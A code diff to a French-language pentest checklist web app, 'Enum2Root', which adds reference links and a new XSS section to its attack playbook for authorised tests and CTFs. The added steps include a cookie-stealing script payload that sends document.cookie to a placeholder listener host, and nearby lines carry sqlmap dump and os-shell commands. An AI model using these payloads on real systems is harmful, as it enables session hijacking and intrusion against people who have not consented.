@@ -176,6 +176,8 @@
   .hist-empty{color:var(--muted);font-style:italic;font-size:12px;padding:14px 4px}
   .sec-head .htlink{font-size:11px;color:var(--accent);text-decoration:none;border:1px solid var(--border);border-radius:6px;padding:2px 7px;white-space:nowrap}
   .sec-head .htlink:hover{border-color:var(--accent);background:var(--panel2)}
+  .sec-head .pattlink{font-size:11px;color:var(--tok);text-decoration:none;border:1px solid var(--border);border-radius:6px;padding:2px 7px;white-space:nowrap}
+  .sec-head .pattlink:hover{border-color:var(--tok);background:var(--panel2)}
   .viewsw{display:flex;gap:4px;margin-bottom:10px}
   .viewsw button{flex:1;background:var(--panel2);border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:5px;font-size:11.5px;cursor:pointer}
   .viewsw button.on{background:var(--accent);color:#0b0d10;font-weight:600}
@@ -202,7 +204,7 @@
 </head>
 <body>
 <header>
-  <h1>Enum2Root <span class="tag">dynamique</span> <a class="langswitch" href="index.html" title="English version">EN</a></h1>
+  <h1>Enum2Root <span class="tag">dynamique</span> <a class="langswitch" href="index.html" title="English version">EN</a> <a class="langswitch" href="https://enum2root.readthedocs.io" target="_blank" rel="noopener" title="Documentation">📖 Docs</a></h1>
   <div class="sub">Saisis ta cible + coche <b>ce que tu possèdes</b> : les actions dont tu as les prérequis s'allument. Inspiré des mindmaps OCD / WADComs. Usage en test autorisé / CTF / lab uniquement.<br>Clique la case de chaque étape pour son statut : <b>·</b> à faire → <b style="color:var(--green)">✓</b> validé → <b style="color:var(--red)">✗</b> non valide → <b>∅</b> non concerné.</div>
   <div class="controls">
     <div class="field"><label for="ip">IP cible</label><input type="text" id="ip" placeholder="10.10.10.10" value="10.10.10.10"></div>
@@ -333,6 +335,7 @@ const REFS={
   vnc:HT+"network-services-pentesting/pentesting-vnc.html",
   ipmi:HT+"network-services-pentesting/623-udp-ipmi.html",
   sqli:HT+"pentesting-web/sql-injection/index.html",
+  xss:HT+"pentesting-web/xss-cross-site-scripting/index.html",
   lfi:HT+"pentesting-web/file-inclusion/index.html",
   ssti:HT+"pentesting-web/ssti-server-side-template-injection/index.html",
   cmdinj:HT+"pentesting-web/command-injection.html",
@@ -352,6 +355,20 @@ const REFS={
   winpriv:HT+"windows-hardening/windows-local-privilege-escalation/index.html",
   pivot:HT+"generic-hacking/tunneling-and-port-forwarding.html",
 };
+
+// Liens PayloadsAllTheThings par section (chaîne vide = accueil du dépôt)
+const PATT_BASE="https://swisskyrepo.github.io/PayloadsAllTheThings/";
+const PATT={
+  web:"",
+  sqli:"SQL Injection",
+  xss:"XSS Injection",
+  lfi:"File Inclusion",
+  cmdinj:"Command Injection",
+  ssti:"Server Side Template Injection",
+  upload:"Upload Insecure Files",
+  bruteweb:"Account Takeover",
+};
+const pattUrl=id=>PATT_BASE+(PATT[id]?encodeURIComponent(PATT[id])+"/":"");
 
 // ============================================================
 //  DONNÉES : phases -> sections -> steps{t,c,needs}
@@ -581,6 +598,13 @@ const DATA=[
      {needs:[], t:"POST request", c:"sqlmap -u \"{URL}/login.php\" --data=\"username=admin&password=test\" --batch --dbs"},
      {needs:[], t:"Depuis une requête capturée + dump", c:"sqlmap -r request.txt --batch --dbs --dump"},
      {needs:[], t:"RCE (si autorisé)", c:"sqlmap -r request.txt --batch --os-shell"},
+   ]},
+  {id:"xss", port:"WEB", svc:"injection", title:"XSS (Cross-Site Scripting)",
+   notes:["Réfléchi / stocké / DOM. Sonder, puis escalader vers vol de cookie ou actions."],
+   steps:[
+     {needs:[], t:"Test rapide (réfléchi)", c:"<script>alert(document.domain)</script>\n\"><img src=x onerror=alert(1)>"},
+     {needs:[], t:"Scan automatisé (dalfox)", c:"dalfox url \"{URL}/search?q=test\""},
+     {needs:[], t:"Vol de cookie (out-of-band)", c:"<script>new Image().src='http://<listener_ip>/c='+document.cookie</script>"},
    ]},
   {id:"lfi", port:"WEB", svc:"inclusion", title:"LFI / Path Traversal",
    notes:["<b>-mc</b> matcher le code, <b>-fs</b> filtrer par taille."],
@@ -828,8 +852,9 @@ function build(){
       el.dataset.ports=(sec.port.match(/\d+/g)||[]).join(',');
       el.dataset.search=(sec.title+' '+sec.port+' '+sec.svc+' '+sec.steps.map(s=>s.t+' '+s.c).join(' ')).toLowerCase();
       const htlink=REFS[sec.id]?`<a class="htlink" href="${REFS[sec.id]}" target="_blank" rel="noopener" title="Ouvrir la page HackTricks" onclick="event.stopPropagation()">HackTricks ↗</a>`:'';
+      const pattlink=(sec.id in PATT)?`<a class="pattlink" href="${pattUrl(sec.id)}" target="_blank" rel="noopener" title="Ouvrir la page PayloadsAllTheThings" onclick="event.stopPropagation()">Payloads ↗</a>`:'';
       let html=`<div class="sec-head"><span class="port">${esc(sec.port)}</span>
-        <h2>${esc(sec.title)} <span class="svc">${esc(sec.svc)}</span></h2><span class="secprog"></span>${htlink}<span class="chev">▾</span></div><div class="sec-body">`;
+        <h2>${esc(sec.title)} <span class="svc">${esc(sec.svc)}</span></h2><span class="secprog"></span>${htlink}${pattlink}<span class="chev">▾</span></div><div class="sec-body">`;
       (sec.notes||[]).forEach(n=>html+=`<div class="note">${n}</div>`);
       sec.steps.forEach((st,idx)=>{
         const sid=sec.id+':'+idx;
